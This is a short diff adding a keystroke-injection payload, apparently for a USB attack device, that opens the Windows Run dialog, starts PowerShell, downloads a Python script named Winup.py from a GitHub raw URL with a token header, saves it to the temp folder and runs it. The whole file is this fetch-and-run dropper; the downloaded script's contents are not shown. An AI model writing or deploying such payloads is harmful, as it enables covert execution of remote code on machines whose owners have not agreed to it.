@@ -1,0 +1,13 @@
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 300
+STRING $headers = @{ Authorization = "token MyPersonalAccessToken" }
+ENTER
+DELAY 100
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/RobotMasterC/Winup/main/Winup.py" -Headers $headers -OutFile "$env:TEMP\Winup.py"
+ENTER
+DELAY 500
+STRING python $env:TEMP\Winup.py
+ENTER
